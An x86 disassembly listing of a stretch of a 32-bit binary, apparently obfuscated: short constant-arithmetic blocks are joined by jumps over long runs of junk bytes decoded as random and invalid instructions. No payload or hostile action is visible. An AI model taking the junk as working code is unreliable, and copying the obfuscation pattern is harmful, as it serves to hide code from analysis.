  416f1e:	add    DWORD PTR [esi+0xe476d67],edi
  416f24:	inc    esp
  416f25:	push   esi
  416f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f27:	aad    0xcf
  416f29:	popf   
  416f2a:	inc    edi
  416f2b:	imul   BYTE PTR [edi+0x771cb0c8]
  416f31:	aam    0x42
  416f33:	ss ret 0xdd33
  416f37:	sub    dl,BYTE PTR [edx-0x24017640]
  416f3d:	sub    DWORD PTR [edi+0x190fc9db],esi
  416f43:	xor    ch,BYTE PTR [esi+0x28945b69]
  416f49:	(bad)  
  416f4a:	clc    
  416f4b:	xlat   BYTE PTR ds:[ebx]
  416f4c:	push   edi
  416f4d:	add    al,0x68
  416f4f:	repnz mov fs,esi
  416f52:	pop    ebx
  416f53:	mov    eax,0x6b8b79b8
  416f58:	adc    BYTE PTR [ebx-0x60],bl
  416f5b:	add    eax,0xd7725ec8
  416f60:	push   0x72
  416f62:	repnz daa 
  416f64:	cdq    
  416f65:	mov    ecx,0x4513a53c
  416f6a:	xor    al,BYTE PTR ds:[esp+ebp*1-0x2d]
  416f6f:	jg     0x416f67
  416f71:	jmp    0x946c:0xbb346266
  416f78:	mov    DWORD PTR [edi-0x31a5d7c8],esi
  416f7e:	sub    eax,0xe0c803fc
  416f83:	or     esp,DWORD PTR [ebx+ebp*2-0x1d]
  416f87:	pop    ss
  416f88:	rcl    DWORD PTR ds:0x4a09d12a,0x95
  416f8f:	ins    DWORD PTR es:[edi],dx
  416f90:	ja     0x416fad
  416f92:	pop    eax
  416f93:	lods   al,BYTE PTR ds:[esi]
  416f94:	fs add al,0xed
  416f97:	loop   0x416fac
  416f99:	in     al,dx
  416f9a:	jmp    0x416ff5
  416f9c:	mov    ecx,0x2223d7e6
  416fa1:	fist   DWORD PTR [eax-0x18]
  416fa4:	add    eax,0x8b0000ce
  416fa9:	dec    ebp
  416faa:	loopne 0x416f37
  416fac:	push   ebp
  416fad:	in     al,0xd
  416faf:	loop   0x41702e
  416fb1:	add    BYTE PTR [eax],al
  416fb3:	sub    eax,ecx
  416fb5:	mov    ecx,DWORD PTR [ebp-0x4]
  416fb8:	jmp    0x41708c
  416fbd:	xor    al,0x6b
  416fbf:	adc    edx,DWORD PTR [edi+ebx*2+0x7c]
  416fc3:	ja     0x417030
  416fc5:	jmp    0xfba0720a
  416fca:	adc    eax,0x50739d2
  416fcf:	add    DWORD PTR [eax],eax
  416fd1:	mov    bh,0x0
  416fd3:	add    BYTE PTR [eax],al
  416fd5:	fild   WORD PTR [eax+0x39bb5a61]
  416fdb:	xchg   BYTE PTR [eax],cl
  416fdd:	and    DWORD PTR [esi],edx
  416fdf:	ficomp DWORD PTR [edx+edi*1+0x23]
  416fe3:	sub    al,0xa2
  416fe5:	nop
  416fe6:	stc    
  416fe7:	cmp    al,0x9b
  416fe9:	xchg   edx,eax
  416fea:	cmp    ebp,esi
  416fec:	and    eax,0x9c8f099d
  416ff1:	push   ebp
  416ff2:	shl    DWORD PTR [ebp+0x6bb24919],0x5b
  416ff9:	mov    edx,0x211fa60e
  416ffe:	or     al,0x56
  417000:	in     eax,dx
  417001:	cmp    DWORD PTR [edi+0x48ecfc60],ecx
  417007:	pop    ecx
  417008:	(bad)  
  417009:	push   esp
  41700a:	sbb    ebp,eax
  41700c:	repnz mov WORD PTR [esi+0x8d90f9d],fs
  417013:	mov    ah,0xa2
  417015:	mov    ebp,0xbca0f9cf
  41701a:	jmp    0x7b72fa66
  41701f:	test   BYTE PTR [edx-0x7d42b7de],ch
  417025:	jne    0x41709e
  417027:	push   ss
  417028:	or     al,0x36
  41702a:	loopne 0x416fb7
  41702c:	cmp    eax,0x12fce95a
  417031:	pop    es
  417032:	call   edx
  417034:	mov    ds:0xbe2b3e5f,al
  417039:	xchg   ebp,eax
  41703a:	add    al,0x21
  41703c:	(bad)  
  41703d:	push   ecx
  41703e:	xchg   edi,eax
  41703f:	fisubr DWORD PTR [ebx]
  417041:	cmc    
  417042:	sub    DWORD PTR [ebx+0x16],0x14
  417046:	cwde   
  417047:	js     0x416ff6
  417049:	iret   
  41704a:	mov    ecx,0x1a3cb30f
  41704f:	sbb    BYTE PTR [edx+0x6d],ch
  417052:	push   ecx
  417053:	push   esi
  417054:	mov    bl,0x34
  417056:	fnstcw WORD PTR [ebx]
  417058:	jns    0x417059
  41705a:	call   eax
  41705c:	ja     0x417045
  41705e:	pop    es
  41705f:	fimul  WORD PTR [edx+0x2b]
  417062:	xor    ch,al
  417064:	fsubp  st(1),st
  417066:	nop
  417067:	fiadd  DWORD PTR [ebp+ebx*8-0x74]
  41706b:	cmp    edi,DWORD PTR [ecx-0x6972f1a3]
  417071:	pop    ds
  417072:	mov    bl,0x26
  417074:	pushf  
  417075:	in     al,dx
  417076:	xchg   esp,eax
  417077:	add    eax,0x60c8bf1e
  41707c:	fst    QWORD PTR [edx+0x6e]
  41707f:	inc    edx
  417080:	leave  
  417081:	push   0xfffffff2
  417083:	inc    esp
  417084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417085:	sbb    eax,DWORD PTR [edx-0x79]
  417088:	or     cl,BYTE PTR [ebp+0x312d1186]
  41708e:	inc    ecx
  41708f:	add    BYTE PTR [eax],al
  417091:	or     ecx,0x52c9
  417097:	mov    DWORD PTR [esi+ecx*4-0x1cfe0],eax
  41709e:	jmp    0x417172
  4170a3:	xchg   ebp,eax
  4170a4:	xor    DWORD PTR [esi+edi*1-0x4460405c],esp
  4170ab:	jbe    0x4170cb
  4170ad:	mov    esi,0xe00b720d
  4170b2:	mov    eax,ds:0x105be
  4170b7:	mov    bh,0x0
  4170b9:	add    BYTE PTR [eax],al
  4170bb:	das    
  4170bc:	(bad)  
  4170bd:	dec    BYTE PTR [edx+ebx*1-0x72]
  4170c1:	aaa    
  4170c2:	add    BYTE PTR [ecx-0x33],ah
  4170c5:	or     ebp,ebx
  4170c7:	jbe    0x417127
  4170c9:	and    eax,0x34b4b9a7
  4170ce:	daa    
  4170cf:	and    DWORD PTR [eax],ecx
  4170d1:	mov    eax,0x1b90b531
  4170d6:	jb     0x417130
  4170d8:	xchg   ecx,eax
  4170d9:	enter  0x3406,0xca
  4170dd:	cmp    DWORD PTR [esi+edx*8-0x71],0x228f722c
  4170e5:	mov    dh,0x9
  4170e7:	fst    QWORD PTR [eax+eiz*1+0x10]
  4170eb:	jns    0x4170d5
  4170ed:	aad    0x82
  4170ef:	test   al,0xec
  4170f1:	pop    esi
  4170f2:	cli    
  4170f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170f4:	push   ebx
  4170f5:	shr    bh,0x2b
  4170f8:	aam    0x2b
  4170fa:	into   
  4170fb:	pop    ebx
  4170fc:	jecxz  0x417122
  4170fe:	sub    eax,DWORD PTR [ebx+0x2648e94b]
  417104:	dec    edi
  417105:	pop    ecx
  417106:	xor    ecx,DWORD PTR [edi]
  417108:	xchg   BYTE PTR [ebp-0x37],dl
  41710b:	push   ebx
  41710c:	pop    eax
  41710d:	ss out 0x49,eax
  417110:	leave  
  417111:	test   al,0x1e
  417113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417114:	pusha  
  417115:	aaa    
  417116:	or     al,0x6f
  417118:	jb     0x4170eb
  41711a:	iret   
  41711b:	repz xor eax,0x5a40b2c
  417121:	dec    BYTE PTR [ebx]
  417123:	xchg   esp,eax
  417124:	cmp    edi,eax
  417126:	js     0x41719d
  417128:	ret    0x553f
  41712b:	out    0x3f,eax
  41712d:	push   es
  41712e:	sti    
  41712f:	out    0x28,eax
  417131:	push   eax
  417132:	cmp    esp,ebx
  417134:	rcr    DWORD PTR [esi+0x7b],1
  417137:	dec    esi
  417138:	mov    DWORD PTR ds:0x1d85f804,ebp
  41713e:	(bad)  
  41713f:	mov    ebp,0x92ae20ab
  417144:	push   ecx
  417145:	mov    ch,0xe0
  417147:	mov    eax,ds:0x5273cb68
  41714c:	fisttp QWORD PTR [edi]
  41714e:	sbb    BYTE PTR [eax-0x54],0x83
  417152:	adc    eax,0xaaa38127
  417157:	ds (bad) 
  417159:	pop    esp
  41715a:	xor    al,0xa2
  41715c:	dec    eax
  41715d:	sub    edi,0xffffffe3
  417160:	out    dx,eax
  417161:	in     eax,dx
  417162:	xor    dh,BYTE PTR [ecx+0x71]
  417165:	dec    esp
  417166:	outs   dx,BYTE PTR ds:[esi]
  417167:	and    DWORD PTR [eax],edx
  417169:	fdivr  DWORD PTR [eax+ebp*1+0x49e92462]
  417170:	jne    0x417197
  417172:	mov    DWORD PTR [ebp-0xc],0x5bd4
  417179:	mov    DWORD PTR [ebp-0x4],0x5b1f
  417180:	mov    eax,DWORD PTR [ebp-0x4]
  417183:	jmp    0x417257
  417188:	aaa    
  417189:	lock enter 0xcf90,0xb8
  41718e:	jg     0x417187
  417190:	inc    esi
  417191:	mov    ebx,0x5031de70
  417196:	repnz pop edi
  417198:	jne    0x4171a0
  41719a:	add    DWORD PTR [eax],eax
  41719c:	mov    bh,0x0
  41719e:	add    BYTE PTR [eax],al
  4171a0:	jmp    0x6aa6:0xe306d23f
  4171a7:	ret    
  4171a8:	cdq    
  4171a9:	or     al,0x62
  4171ab:	jge    0x4171d1
  4171ad:	scas   eax,DWORD PTR es:[edi]
  4171ae:	ret    0x5a22
  4171b1:	imul   esi,DWORD PTR [esi],0x5796335f
  4171b7:	add    edi,DWORD PTR [ebx+esi*4]
  4171ba:	mov    dl,0x73
  4171bc:	fdivrp st(5),st
  4171be:	jge    0x4171d3
  4171c0:	test   eax,0x4afbc192
  4171c5:	mov    edx,esp
  4171c7:	sbb    DWORD PTR [ebx-0x56],ebx
  4171ca:	xchg   ebp,eax
  4171cb:	xor    DWORD PTR [edx+0x559acc10],0xffffffd2
  4171d2:	inc    esi
  4171d3:	add    ecx,edx
  4171d5:	adc    eax,0xfcf31e5f
  4171da:	xchg   ecx,eax
  4171db:	fsub   QWORD PTR [esi]
  4171dd:	sbb    eax,0x556ff5ad
  4171e2:	cmp    DWORD PTR [edi+0x1bdba130],edx
  4171e8:	adc    al,0x16
  4171ea:	lea    edi,[ecx-0xb]
  4171ed:	sub    bh,0xad
  4171f0:	xor    ebp,DWORD PTR [edx]
  4171f2:	jl     0x41723e
  4171f4:	scas   eax,DWORD PTR es:[edi]
  4171f5:	loopne 0x417266
  4171f7:	adc    cl,BYTE PTR [eax]
  4171f9:	sub    BYTE PTR [esi],bl
  4171fb:	add    eax,0xd650bd92
  417200:	pop    ss
  417201:	inc    esi
  417202:	or     DWORD PTR [ecx+0x4878456],esi
  417208:	mov    esi,0xe8c1d47
  41720d:	es push edi
  41720f:	push   eax
  417210:	test   eax,0xedaf0969
  417215:	push   DWORD PTR [ecx]
  417217:	enter  0x9e0e,0x3f
  41721b:	(bad)  
  41721c:	add    ebx,DWORD PTR [ebx+0x50]
  41721f:	sbb    DWORD PTR [edx+0x1c83528f],edx
  417225:	jmp    0x5b3a370e
  41722a:	stos   BYTE PTR es:[edi],al
  41722b:	(bad)  
  41722c:	mov    dh,BYTE PTR [eax+0x74]
  41722f:	stos   BYTE PTR es:[edi],al
  417230:	or     al,0xb4
  417232:	mov    ds:0x17538fec,eax
  417237:	loope  0x4171bd
  417239:	test   eax,0xce362864
  41723e:	gs mov ecx,0x2d900120
  417244:	xchg   ecx,eax
  417245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417246:	mov    eax,ds:0x500bfc3b
  41724b:	jnp    0x4171de
  41724d:	xchg   ebx,eax
  41724e:	jmp    0x8bffa644
  417253:	daa    
  417254:	xor    dh,BYTE PTR [ebp-0x20]
  417257:	mov    ecx,DWORD PTR [ebp-0xc]
  41725a:	jmp    0x41732e
  41725f:	mov    ecx,0x8d898dbd
  417264:	mov    ecx,0x5e04bdbd
  417269:	mov    eax,0x416b306e
  41726e:	fisubr WORD PTR [edi+eax*1]
  417271:	add    DWORD PTR [eax],eax
  417273:	mov    bh,0x0
  417275:	add    BYTE PTR [eax],al
  417277:	and    al,0x79
  417279:	xchg   ebx,eax
  41727a:	xor    ebp,esp
  41727c:	test   BYTE PTR [ecx],dh
  41727e:	mov    gs,WORD PTR [edi+0x57d7a715]
  417284:	int3   
  417285:	inc    edi
  417286:	enter  0xfb60,0x70
  41728a:	out    0x91,al
  41728c:	call   0x528c6dda
  417291:	mov    edi,0xa8df4596
  417296:	xchg   edx,eax
  417297:	rcl    BYTE PTR [ecx+0x40a4ac83],1
  41729d:	sbb    eax,0x89d2dc0
  4172a2:	lds    ebp,FWORD PTR [esi-0x33]
  4172a5:	add    bl,dh
  4172a7:	and    al,0x7
  4172a9:	sub    al,dl
  4172ab:	mul    DWORD PTR [eax]
  4172ad:	inc    ebx
  4172ae:	adc    BYTE PTR [esp+eax*1+0x3],bh
  4172b2:	es pop ebp
  4172b4:	pop    edx
  4172b5:	or     dl,bl
  4172b7:	mov    ds,WORD PTR [ebp-0x2d]
  4172ba:	fs xchg edx,eax
  4172bc:	inc    ecx
  4172bd:	jo     0x41733a
  4172bf:	xchg   ebp,eax
  4172c0:	mov    DWORD PTR [edx-0x61],esi
  4172c3:	cmp    al,0xca
  4172c5:	push   0x742d3549
  4172ca:	and    eax,0x106227d2
  4172cf:	(bad)  
  4172d0:	rcl    al,1
  4172d2:	mul    eax
  4172d4:	push   ebx
  4172d5:	push   0xb7b69bef
  4172da:	sub    al,0x73
  4172dc:	fs adc al,0x9e
  4172df:	pop    ds
  4172e0:	push   ebx
  4172e1:	and    BYTE PTR [edx-0x50565a2d],bh
  4172e7:	push   cs
  4172e8:	mov    esi,0xafc2c0f6
  4172ed:	(bad)  
  4172ee:	mov    ch,0x91
  4172f0:	les    edi,FWORD PTR [eax]
  4172f2:	sub    ecx,0x19
  4172f5:	gs div edx
  4172f8:	repz cmc 
  4172fa:	pop    es
  4172fb:	xor    BYTE PTR [ebp+0x0],cl
  4172fe:	mov    eax,ds:0x17159d37
  417303:	sub    DWORD PTR [ebx+0x4f],0x3ffe0392
  41730a:	clc    
  41730b:	cmp    ebx,DWORD PTR [eax]
  41730d:	pop    esp
  41730e:	test   BYTE PTR [eax+0x75],dl
  417311:	sbb    eax,0x97998a53
  417316:	mov    ds:0x3d04508e,eax
  41731b:	cmc    
  41731c:	les    eax,FWORD PTR [esi]
  41731e:	xchg   ecx,eax
  41731f:	mov    esp,0x860d8e93
  417324:	daa    
  417325:	out    dx,eax
  417326:	pusha  
  417327:	sub    BYTE PTR [edx],al
  417329:	mov    bh,0x49
  41732b:	frstor [esi]
  41732d:	retf   0xc069
  417330:	inc    ecx
  417331:	sub    BYTE PTR [eax],al
  417333:	add    BYTE PTR [ebx],cl
  417335:	shr    ecx,0xcf
  417338:	add    BYTE PTR [eax],al
  41733a:	add    BYTE PTR [edi],cl
  41733c:	mov    ebx,0x7bb473b0
  417341:	iret   
  417342:	inc    eax
  417344:	mov    al,ds:0xf84833a5
  417349:	add    ah,BYTE PTR [ecx+0x107e3]
  41734f:	mov    bh,0x0
  417351:	add    BYTE PTR [eax],al
  417353:	dec    edx
  417354:	and    al,0xa9
  417356:	and    bl,BYTE PTR [ecx-0x79995f71]
  41735c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41735d:	sbb    BYTE PTR [esi-0x2c],cl
  417360:	mov    ds:0x97ceb07e,al
  417365:	pushf  
  417366:	mov    ah,0x57
  417369:	jmp    0x41732e
  41736b:	stos   BYTE PTR es:[edi],al
  41736c:	repz (bad) 
  41736e:	jmp    0x5f029ee2
  417373:	push   0xffffffb5
  417375:	int    0x27
  417377:	fbld   TBYTE PTR [edx+0x139293c4]
  41737d:	or     cl,BYTE PTR [eax]
  41737f:	fwait
  417380:	daa    
  417381:	es jmp 0xaeac12dc
  417387:	inc    esi
  417388:	in     al,dx
  417389:	inc    esp
  41738a:	cwde   
  41738b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41738c:	jmp    0x417374
  41738e:	mov    dh,bh
  417390:	stos   DWORD PTR es:[edi],eax
  417391:	pop    ecx
  417392:	rcr    BYTE PTR [eax-0x79],cl
  417395:	push   eax
  417396:	(bad)  
  417397:	mov    dl,0xef
  417399:	lea    ebx,[edx-0x6a]
  41739c:	out    dx,al
  41739d:	xor    eax,0x4fe774ae
  4173a2:	outs   dx,BYTE PTR ds:[esi]
  4173a3:	(bad)  
  4173a4:	dec    edi
  4173a5:	cwde   
  4173a6:	arpl   WORD PTR [eax-0x41959021],di
  4173ac:	mov    esi,0xbf7c584f
  4173b1:	dec    eax
  4173b2:	sub    ecx,esp
  4173b4:	pop    es
  4173b5:	retf   
  4173b6:	unpcklps xmm0,XMMWORD PTR [ebx]
  4173b9:	jb     0x417348
  4173bb:	jg     0x4173f3
  4173bd:	push   es
  4173be:	mov    dl,ch
  4173c0:	push   ecx
  4173c1:	mov    ch,0xb0
  4173c3:	retf   0x64ed
  4173c6:	jne    0x4173a1
  4173c8:	rcr    edi,1
  4173ca:	and    al,0xc9
  4173cc:	or     BYTE PTR ds:0x21447ba3,ah
  4173d2:	shr    DWORD PTR ds:0x7a486ae7,cl
  4173d8:	xor    ah,ah
  4173da:	outs   dx,DWORD PTR ds:[esi]
  4173db:	scas   al,BYTE PTR es:[edi]
  4173dc:	pop    edi
  4173dd:	add    DWORD PTR es:[esi+ebp*1],esi
  4173e1:	scas   eax,DWORD PTR es:[edi]
  4173e2:	stos   BYTE PTR es:[edi],al
  4173e3:	imul   edx,DWORD PTR ds:0x5c64dba6,0x5aeeac23
  4173ed:	jge    0x4173f1
  4173ef:	test   DWORD PTR [ebx],edi
  4173f1:	xchg   ebx,eax
  4173f2:	in     eax,dx
  4173f3:	push   esp
  4173f4:	push   esp
  4173f5:	faddp  st(7),st
  4173f7:	les    ebx,FWORD PTR [edi-0xa]
  4173fa:	add    BYTE PTR [esi+ebx*4-0x6635251b],dl
  417401:	cmp    ecx,esp
  417403:	(bad)
  417406:	push   cs
  417407:	lods   al,BYTE PTR ds:[esi]
  417408:	push   edi
  417409:	cli    
  41740a:	add    eax,0x5eab
  41740f:	xor    edx,edx
  417411:	mov    ecx,0x4824
  417416:	div    ecx
  417418:	mov    ecx,DWORD PTR [ebp+0x8]
  41741b:	jmp    0x4174ef
  417420:	xchg   esp,ebx
  417422:	push   0xefb67b02
  417427:	ffree  st(1)
  417429:	lock sbb eax,0xd51c4bbf
  41742f:	lahf   
  417430:	call   0x0:0xb7000108
  417437:	add    BYTE PTR [eax+0x3d143c3f],bh
  41743d:	fistp  DWORD PTR [eax]
  41743f:	aas    
  417440:	idiv   DWORD PTR [eax]
  417442:	pop    ss
  417443:	and    eax,DWORD PTR [edi+0x24f13f29]
  417449:	fiadd  WORD PTR [esi]
  41744b:	dec    eax
  41744c:	jbe    0x417452
  41744e:	xchg   esp,eax
  41744f:	lock pop ds
  417451:	cmp    BYTE PTR [edi],cl
  417453:	inc    edx
  417454:	ja     0x4173f2
  417456:	lea    eax,[edx-0x456ecfee]
  41745c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41745d:	les    ecx,FWORD PTR [edi-0x54]
  417460:	xchg   edx,eax
  417461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417462:	mov    BYTE PTR [ebx+0x6d],cl
  417465:	push   esp
  417466:	lock repz mov esi,DWORD PTR [ecx]
  41746a:	adc    dh,BYTE PTR [edx]
  41746c:	or     cl,BYTE PTR [eax+0x52f71442]
  417472:	or     eax,DWORD PTR [ebx-0xa]
  417475:	lods   al,BYTE PTR ds:[esi]
  417476:	cmp    ebp,DWORD PTR [ebp+0x1898cec5]
  41747c:	test   eax,0x1d0eb4a
  417481:	pop    ebp
  417482:	push   cs
  417483:	or     eax,0x89e9434
  417488:	or     bh,dh
  41748a:	mov    ebp,0x2a6cee03
  41748f:	test   al,0x1e
  417491:	sbb    ecx,DWORD PTR [edx+0x742a73bf]
  417497:	test   al,0x80
  417499:	test   BYTE PTR [ecx+0x55993a8e],0xe3
  4174a0:	arpl   bp,si
  4174a2:	imul   esi,DWORD PTR [ebp-0x3e4c6bfe],0xffffffea
  4174a9:	fdivr  st(2),st
  4174ab:	enter  0xf71d,0x20
  4174af:	in     al,0xe0
  4174b1:	test   BYTE PTR [esi+0x2c],0xe0
  4174b5:	cmp    esi,eax
  4174b7:	cmp    DWORD PTR [esi-0x14],edi
  4174ba:	pop    ds
  4174bb:	ss pop ss
  4174bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174be:	mov    ecx,0xfcdec1b6
  4174c3:	mov    al,ds:0x3e1f147b
  4174c8:	or     BYTE PTR [ebp+0x4d2f752e],al
  4174ce:	outs   dx,BYTE PTR ds:[esi]
  4174cf:	imul   edx,DWORD PTR [esi],0x5
  4174d2:	inc    ebp
  4174d3:	cmp    al,0x6e
  4174d5:	sar    BYTE PTR [eax+0x79b9d5af],cl
  4174db:	pop    es
  4174dc:	and    al,BYTE PTR [ecx+ebx*2+0x6d84f942]
  4174e3:	adc    bl,ah
  4174e5:	jl     0x4174f9
  4174e7:	push   cs
  4174e8:	dec    edx
  4174e9:	jp     0x4174a8
  4174eb:	push   ds
  4174ec:	aaa    
  4174ed:	or     BYTE PTR [eax],0x33
  4174f0:	shl    BYTE PTR ds:0x32d8,cl
  4174f6:	mov    DWORD PTR [esi+eax*4+0x4],ecx
  4174fa:	mov    DWORD PTR [ebp+0x8],0x6283
  417501:	mov    eax,DWORD PTR [ebp+0x8]
  417504:	xor    eax,0x2492
  417509:	jmp    0x4175dd
  41750e:	jmp    0x41755d
  417510:	dec    esp
  417511:	sbb    dh,ch
  417513:	sbb    edi,edi
  417515:	inc    DWORD PTR [ebx-0x54]
  417518:	inc    edi
  417519:	jp     0x417593
  41751b:	cmp    eax,0x9516e47
  417520:	add    DWORD PTR [eax],eax
  417522:	mov    bh,0x0
  417524:	add    BYTE PTR [eax],al
  417526:	dec    eax
  417527:	imul   edi,DWORD PTR [edi-0x54e21976],0xffffffe6
  41752e:	mov    dh,0x75
  417530:	mov    DWORD PTR [ebp+0x190ab8bc],ebx
  417536:	jge    0x417538
  417538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417539:	dec    eax
  41753a:	add    bl,bl
  41753c:	pop    eax
  41753d:	ins    BYTE PTR es:[edi],dx
  41753e:	mov    ah,0x66
  417540:	adc    dl,ch
  417542:	fwait
  417543:	repnz sbb BYTE PTR [ebx],bl
  417546:	adc    DWORD PTR [edi-0x58],ebx
  417549:	pop    ss
  41754a:	cmc    
  41754b:	vmpsadbw xmm0,xmm4,XMMWORD PTR [edi-0x74],0xf8
  417552:	mov    edx,0xdd4b71b1
  417557:	dec    ebp
  417558:	sti    
  417559:	cmp    dh,BYTE PTR [edi+ebx*4-0x5fcd4e0d]
  417560:	test   eax,0x58f5b264
  417565:	fwait
  417566:	stos   DWORD PTR es:[edi],eax
  417567:	xor    eax,0xb4b0bf0c
  41756c:	out    dx,eax
  41756d:	dec    ebx
  41756e:	cmp    bh,dh
  417570:	cwde   
  417571:	pop    ss
  417572:	in     eax,dx
  417573:	hlt    
  417574:	inc    esp
  417575:	or     DWORD PTR [ebx-0x58],edi
  417578:	push   esp
  417579:	test   edi,eax
  41757b:	pusha  
  41757c:	sub    DWORD PTR [esp+eiz*8],0xffffffe3
  417580:	test   al,0x48
  417582:	sub    DWORD PTR [edi-0x22],ecx
  417585:	cmp    al,0x9d
  417587:	xor    eax,0x1f645c34
  41758c:	pop    edx
  41758d:	sub    BYTE PTR [edi],ah
  41758f:	sbb    BYTE PTR [ebx],0x5
  417592:	scas   al,BYTE PTR es:[edi]
  417593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417594:	push   es
  417595:	dec    eax
  417596:	mov    bl,0x71
  417598:	jbe    0x4175f2
  41759a:	ds ret 0xf707
  41759e:	mov    ch,0x90
  4175a0:	inc    ebx
  4175a1:	mov    esi,0x959fff9e
  4175a6:	test   DWORD PTR [ecx+ebp*4-0x4c2e737c],eax
  4175ad:	jp     0x417604
  4175af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175b0:	pop    ebp
  4175b1:	lods   eax,DWORD PTR ds:[esi]
  4175b2:	mov    bh,BYTE PTR [eax+0x1b]
  4175b5:	or     eax,0x3cbd91ad
  4175ba:	idiv   DWORD PTR [esi-0x31]
  4175bd:	test   DWORD PTR [edx],ecx
  4175bf:	gs xchg ebx,eax
  4175c1:	mov    cl,0x9a
  4175c3:	or     ebx,eax
  4175c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175c6:	aad    0x8c
  4175c8:	pop    ecx
  4175c9:	cmp    ebx,DWORD PTR ds:0x34f04e79
  4175cf:	out    0xfd,al
  4175d1:	scas   eax,DWORD PTR es:[edi]
  4175d2:	ja     0x417558
  4175d4:	cmp    bl,dl
  4175d6:	bound  eax,QWORD PTR ds:[ebx+eax*8-0x73]
  4175db:	jne    0x417597
  4175dd:	and    eax,0x74d3
  4175e2:	add    eax,0xc09e
  4175e7:	xor    eax,0x3d61
  4175ec:	mov    ecx,0x9ce7
  4175f1:	div    ecx
  4175f3:	mov    ecx,DWORD PTR [ebp+0xc]
  4175f6:	jmp    0x4176ca
  4175fb:	das    
  4175fc:	imul   ebx,DWORD PTR [edx+0x6d],0x6b3f7f5e
  417603:	packuswb mm6,mm3
  417606:	mov    eax,ds:0xa59d2837
  41760b:	or     BYTE PTR [edx],cl
  41760d:	add    DWORD PTR [eax],eax
  41760f:	mov    bh,0x0
  417611:	add    BYTE PTR [eax],al
  417613:	inc    edi
  417614:	jge    0x4175d2
  417616:	mov    eax,ds:0x7652cb4a
  41761b:	adc    BYTE PTR [ecx+eax*8+0x33e5090],0xc6
  417623:	fidivr WORD PTR [edx+0x38]
  417626:	test   eax,0x5e06969d
  41762b:	iret   
  41762c:	cwde   
  41762d:	test   DWORD PTR [ebp+0x6],ebx
  417630:	(bad)  
  417631:	lods   al,BYTE PTR ds:[esi]
  417632:	jns    0x4176a9
  417634:	and    al,0xf8
  417636:	jge    0x4176ae
  417638:	jbe    0x4175f6
  41763a:	or     DWORD PTR [esi+0x7b9392e2],eax
  417640:	out    dx,eax
  417641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417642:	xor    esp,DWORD PTR [eax+0xe]
  417645:	add    bl,BYTE PTR [esi+0x409c011c]
  41764b:	and    al,0xb6
  41764d:	pop    ss
  41764e:	scas   al,BYTE PTR es:[edi]
  41764f:	(bad)  
  417651:	xor    al,0xc4
  417653:	cwde   
  417654:	out    dx,eax
  417655:	div    DWORD PTR [edx+0x18]
  417658:	add    ebp,eax
  41765a:	pushf  
  41765b:	xchg   ecx,eax
  41765c:	pop    ds
  41765d:	push   ds
  41765e:	mov    es:0xed7d6be9,al
  417664:	repnz sub edi,ebx
  417667:	shl    BYTE PTR [esi-0x166086a3],1
  41766d:	add    DWORD PTR [ecx],ebp
  41766f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417670:	inc    ecx
  417671:	mov    dh,0x3a
  417673:	fnsave [esi]
  417675:	mov    edx,DWORD PTR [ebx-0xa]
  417678:	je     0x4176d0
  41767a:	xchg   ebp,eax
  41767b:	mul    BYTE PTR [eax+0x2e82922d]
  417681:	std    
  417682:	sbb    ecx,DWORD PTR [ecx]
  417684:	(bad)  
  417685:	push   ebx
  417686:	retf   0x1426
  417689:	out    dx,al
  41768a:	jmp    0xe81a:0xa8ffbfb4
  417691:	pop    ss
  417692:	lods   eax,DWORD PTR ds:[esi]
  417693:	pusha  
  417694:	sub    esp,DWORD PTR [edi-0x55]
  417697:	imul   esi,DWORD PTR [ebp-0x10f0d28a],0x12
  41769e:	push   0x4740be3e
  4176a3:	xchg   BYTE PTR [ebp+0x60],ch
  4176a6:	into   
  4176a7:	gs jle 0x417695
  4176aa:	sub    al,0x58
  4176ac:	lock push ds
  4176ae:	imul   esi,DWORD PTR [esp+ebp*4-0x2d],0x83bbb11b
  4176b6:	mov    esp,0xfbad7afc
  4176bb:	std    
  4176bc:	jg     0x41768c
  4176be:	pop    ds
  4176bf:	push   es
  4176c0:	js     0x417724
  4176c2:	push   0xffffff9b
  4176c4:	inc    eax
  4176c5:	mov    ch,0xd9
  4176c7:	pop    ecx
  4176c8:	adc    al,0xc3
  4176ca:	mov    DWORD PTR [esi+eax*4+0x4],ecx
  4176ce:	mov    DWORD PTR [ebp-0xc],0x1112
  4176d5:	jmp    0x4177a9
  4176da:	push   cs
  4176db:	retf   
  4176dc:	fisub  DWORD PTR [ecx-0x10804e21]
  4176e2:	pop    ecx
  4176e3:	popf   
  4176e4:	xor    ah,cl
  4176e6:	jb     0x4176e4
  4176e8:	jle    0x4176b7
  4176ea:	mov    edi,0xb700010a
  4176ef:	add    BYTE PTR [eax],al
  4176f1:	add    ch,ch
  4176f3:	dec    ebx
  4176f4:	or     DWORD PTR [edi-0x705309dd],esi
  4176fa:	clc    
  4176fb:	add    ch,bh
  4176fd:	mov    ch,0x5e
  4176ff:	mov    eax,0xcf98ed36
  417704:	pop    eax
  417705:	push   ebp
  417706:	xchg   BYTE PTR [ebx],bh
  417708:	test   al,0xfd
  41770a:	gs inc ebx
  41770c:	test   eax,0xa734b257
  417711:	cmp    eax,0x68bff087
  417716:	ret    0xd109
  417719:	push   ss
  41771a:	retf   
  41771b:	sbb    al,0xd
  41771d:	fdivr  DWORD PTR [ebp+eax*4+0x11c4a505]
  417724:	xlat   BYTE PTR ds:[ebx]
  417725:	test   al,0x91
  417727:	fist   DWORD PTR [edx-0xf]
  41772a:	ins    DWORD PTR es:[edi],dx
  41772b:	sub    eax,0xfa8304dc
  417730:	pop    DWORD PTR [esi]
